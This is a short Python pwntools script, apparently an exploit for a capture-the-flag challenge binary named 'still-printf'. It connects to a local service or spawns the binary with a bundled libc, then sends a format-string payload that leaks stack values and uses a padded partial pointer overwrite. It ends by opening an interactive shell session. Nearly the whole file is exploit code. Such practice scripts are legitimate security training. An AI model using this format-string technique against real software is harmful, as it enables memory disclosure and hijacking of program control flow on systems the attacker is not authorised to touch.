from pwn import *

e = ELF("./still-printf")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("localhost", 9509)
else:
  p = process(["./ld-2.28.so", e.path], env={"LD_PRELOAD": libc.path})


debug()

ui.pause()

pay = "%10x%9$llx"
print(len(pay))
p.send(pay.ljust(0x18, "\x00") + "\x50\x71")


p.interactive()
